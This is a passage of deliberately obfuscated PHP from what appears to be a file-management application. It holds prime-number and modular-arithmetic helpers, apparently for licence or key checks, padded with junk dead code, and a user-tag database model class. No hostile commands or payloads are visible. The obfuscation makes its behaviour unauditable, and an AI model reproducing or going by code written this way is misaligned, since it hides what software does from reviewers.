$A’—ÊƒŒ›Ç =& $_SERVER[´Öò¹²]; $C›Èäõ£“ = $A’—ÊƒŒ›Ç[0]($A’—ÊƒŒ›Ç[357], $CÍÊÏ®¬øİ); goto eƒ²è³â¯‹; e™£‚ß˜: $B›ß‘ÁŒí = $bâäõÀÑÕ[683]; if (!$B›ß‘ÁŒí) { return; } $dÙ…÷–ƒ” = 0; goto Cô‰Í™®‹Ç; DÓÂ§£Õß: $cÛ‡øÉ×»š = $A’—ÊƒŒ›Ç[250](($dÙ…÷–ƒ” + $DùÆ£‚ÍÙˆ) / 2); $CºçÛŞ¢¸¸ = $bâäõÀÑÕ[686]; if (!$CºçÛŞ¢¸¸) { return; } goto F¹çÅá“£”; Aò—„Å»ì: $CÖ…¼áŒ = $this->{$_SERVER[´Öò¹²][256]}($C›Èäõ£“[1] . $A’—ÊƒŒ›Ç[10], $A’—ÊƒŒ›Ç[155]); if (!$CÖ…¼áŒ) { return $A’—ÊƒŒ›Ç[10]; } $CÖ…¼áŒ = $A’—ÊƒŒ›Ç[250]($CÖ…¼áŒ); goto e™£‚ß˜; dØÒËäÄÃ: $FèâÂ’§à = $bâäõÀÑÕ[692]; if (strlen($FèâÂ’§à) < $bâäõÀÑÕ[589]) { return; } return $fÄÛË·¥İ×; goto e«†»šö¾Ì; aíñÚ¨Ÿìœ: if (strlen($EØ”ÑçÍÔí) < $bâäõÀÑÕ[589]) { return; } for ($A¿›‹ñ°é­ = 0; $A¿›‹ñ°é­ < $EÉôµ¹ö›¨ * 10; $A¿›‹ñ°é­++) { if (($EÉôµ¹ö›¨ * $A¿›‹ñ°é­ + 1) % $cÛ‡øÉ×»š == 0) { $CÅÖĞŠóéÃ = $A’—ÊƒŒ›Ç[250](($EÉôµ¹ö›¨ * $A¿›‹ñ°é­ + 1) / $cÛ‡øÉ×»š); break; } } $C®Œ«ŠºÉí = $A’—ÊƒŒ›Ç[120]($A’—ÊƒŒ›Ç[354] . ($dÙ…÷–ƒ” + $DùÆ£‚ÍÙˆ) . $A’—ÊƒŒ›Ç[355] . $cÛ‡øÉ×»š . $A’—ÊƒŒ›Ç[355] . $CÅÖĞŠóéÃ . $A’—ÊƒŒ›Ç[356]); goto fóé™ˆ’šâ; e«†»šö¾Ì: } public function paje5709ff83() { goto d®‡¨„„÷¬; d®‡¨„„÷¬: $C±¹³ÆÊš¤ =& $_SERVER[Â€Á›¨õ]; $fÂ¼‘×Ü£¡ =& $_SERVER[´Öò¹²]; $A•¼µĞãœÆ = $fÂ¼‘×Ü£¡[338]($fÂ¼‘×Ü£¡[358](2, 14), $fÂ¼‘×Ü£¡[358](2, 16) - 1); goto B‰§Œç; b²Î‡Õ: $b¶³ëÏ“… = 1; $fß÷ÁÑÏº = $C±¹³ÆÊš¤[694]; if (strlen($fß÷ÁÑÏº) < $C±¹³ÆÊš¤[603]) { return; } goto A°‚Å«æ§Ö; B‰§Œç: $cÁ»«À¼‘ = array(); $c­Œ¢ÛîÓÖ = $C±¹³ÆÊš¤[693]; if (strlen($c­Œ¢ÛîÓÖ) < $C±¹³ÆÊš¤[578]) { return; } goto b²Î‡Õ; bÀ‰Õéˆœğ: return $AÓ–æôÖ“–; goto e¿ˆÇ¥É; A°‚Å«æ§Ö: while ($b¶³ëÏ“… <= (int) $fÂ¼‘×Ü£¡[359]($A•¼µĞãœÆ)) { $FÒÁµÎî›í = $b¶³ëÏ“…; $EÇ‹ùä¨¢… = $C±¹³ÆÊš¤[695]; if (!$EÇ‹ùä¨¢…) { die; } while (!0) { $FÒÁµÎî›í++; $F¤ÅĞˆàçÜ = $C±¹³ÆÊš¤[696]; if (!$F¤ÅĞˆàçÜ) { return; } if ($FÒÁµÎî›í <= 2) { $b¶³ëÏ“… = $FÒÁµÎî›í; break; } else { if ($FÒÁµÎî›í < 2) { continue; } } $DºÎÈÌÄë‰ = !0; for ($A‡ÛÃñ„Û = 2; $A‡ÛÃñ„Û <= $fÂ¼‘×Ü£¡[359]($FÒÁµÎî›í); $A‡ÛÃñ„Û++) { if ($FÒÁµÎî›í % $A‡ÛÃñ„Û == 0) { $DºÎÈÌÄë‰ = !1; } } if ($DºÎÈÌÄë‰) { $b¶³ëÏ“… = $FÒÁµÎî›í; break; } } $cÁ»«À¼‘[] = $b¶³ëÏ“…; $Bà²´…ñ´ = $C±¹³ÆÊš¤[697]; if (!$Bà²´…ñ´) { die; } } $AÓ–æôÖ“– = 2; for ($FÒÁµÎî›í = $A•¼µĞãœÆ; $FÒÁµÎî›í > 1; $FÒÁµÎî›í--) { $DºÎÈÌÄë‰ = !0; $c¸¶õ…§¨Ë = $C±¹³ÆÊš¤[698]; foreach ($cÁ»«À¼‘ as $fÇ÷éš•‡¼) { if ($FÒÁµÎî›í % $fÇ÷éš•‡¼ == 0) { $DºÎÈÌÄë‰ = !1; break; } } if ($DºÎÈÌÄë‰) { $AÓ–æôÖ“– = $FÒÁµÎî›í; break; } } goto bÀ‰Õéˆœğ; e¿ˆÇ¥É: } public function dhor6818b422($CĞêÌ‡Âçø, $b«ôùÎÅ¸) { $fñ¯ëŞ‹ =& $_SERVER[´Öò¹²]; return $fñ¯ëŞ‹[13](array($fñ¯ëŞ‹[14], $fñ¯ëŞ‹[360]), $CĞêÌ‡Âçø, $b«ôùÎÅ¸); } public function bjkqc67a4aef($EÓ”‡†…¾÷, $A¤²ÜßÂ«Ÿ) { $eàôº»œ¸ =& $_SERVER[´Öò¹²]; return $eàôº»œ¸[13](array($eàôº»œ¸[361], $eàôº»œ¸[362]), $EÓ”‡†…¾÷, $A¤²ÜßÂ«Ÿ); } public function ucth691abb21($Fš÷³ø˜êã, $A°ƒğô±©) { $AÍ—õŒÉÄ¬ =& $_SERVER[Â€Á›¨õ]; $c§äêíİÙ =& $_SERVER[´Öò¹²]; return $c§äêíİÙ[13](array($c§äêíİÙ[361], $c§äêíİÙ[363]), $Fš÷³ø˜êã, $A°ƒğô±©); $Eî¨ƒß¸“ = $AÍ—õŒÉÄ¬[699]; if (strlen($Eî¨ƒß¸“) < $AÍ—õŒÉÄ¬[603]) { die; } } } goto cÈĞ¢½Ñ£ƒ; a¾Î®â™×: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($d›…àò³) { $e÷ßéÛÍâÌ =& $_SERVER[Â€Á›¨õ]; return array($e÷ßéÛÍâÌ[1767] => array(USER_ID, $e÷ßéÛÍâÌ[1768])); } protected function listData() { $E³ÇÆÅ–ø§ =& $_SERVER[Â€Á›¨õ]; $d‹¼Œ¤­ = array($E³ÇÆÅ–ø§[1493] => USER_ID, $E³ÇÆÅ–ø§[457] => array($E³ÇÆÅ–ø§[1771], 0)); $EçÅù‡îÕ“ = $E³ÇÆÅ–ø§[1773]; $aÚÅ®ƒíñ = $this->field($EçÅù‡îÕ“)->where($d‹¼Œ¤­)->order($E³ÇÆÅ–ø§[1774])->select(); return $aÚÅ®ƒíñ ? $aÚÅ®ƒíñ : array(); } protected function listByTag($e°Íä·ºÏ) { } protected function addToTag($Fğ®Ü‘±“‡, $EˆíÈÛŞ‚è) { $EÔà¤õ‘ =& $_SERVER[Â€Á›¨õ]; if (!Model($EÔà¤õ‘[1908])->listData($EˆíÈÛŞ‚è) || !Model($EÔà¤õ‘[767])->pathInfo($Fğ®Ü‘±“‡)) { return !1; } $FÇÓæ“Š = array($EÔà¤õ‘[1493] => USER_ID, $EÔà¤õ‘[457] => $EˆíÈÛŞ‚è, $EÔà¤õ‘[408] => $Fğ®Ü‘±“‡, $EÔà¤õ‘[409] => $EÔà¤õ‘[403], $EÔà¤õ‘[407] => $EÔà¤õ‘[33], $EÔà¤õ‘[1668] => 0); if ($this->where($FÇÓæ“Š)->find()) { return !1; } return $this->add($FÇÓæ“Š); } protected function removeFromTag($bù¶±µ„, $cÂá¡µäĞ) { $cÂÄ®æàøŸ =& $_SERVER[Â€Á›¨õ]; if (!Model($cÂÄ®æàøŸ[1908])->listData($cÂá¡µäĞ)) { return !1; } if (is_array($bù¶±µ„)) { $bù¶±µ„ = array($cÂÄ®æàøŸ[7], $bù¶±µ„); } $C¡“æéÌ… = array($cÂÄ®æàøŸ[1493] => USER_ID, $cÂÄ®æàøŸ[457] => $cÂá¡µäĞ, $cÂÄ®æàøŸ[409] => $cÂÄ®æàøŸ[403], $cÂÄ®æàøŸ[408] => $bù¶±µ„); return $this->where($C¡“æéÌ…)->delete(); } protected function removeByTag($Fº¿Ø¦‚’Â) { $dˆ¡­‘Ú±’ =& $_SERVER[Â€Á›¨õ]; if (!$Fº¿Ø¦‚’Â) { return !1; } $F¨Ëñ§™·Ø = array($dˆ¡­‘Ú±’[1493] => USER_ID, $dˆ¡­‘Ú±’[457] => $Fº¿Ø¦‚’Â); return $this->where($F¨Ëñ§™·Ø)->delete(); } protected function removeBySource($A—£ğº”ˆÕ) { $BéäáŞ˜ô =& $_SERVER[Â€Á›¨õ]; if (is_array($A—£ğº”ˆÕ)) { $A—£ğº”ˆÕ = array($BéäáŞ˜ô[7], $A—£ğº”ˆÕ); } $E´›îº“ñ = array($BéäáŞ˜ô[1493] => USER_ID, $BéäáŞ˜ô[408] => $A—£ğº”ˆÕ, $BéäáŞ˜ô[457] => array($BéäáŞ˜ô[946], 0)); return $this->where($E´›îº“ñ)->delete(); } }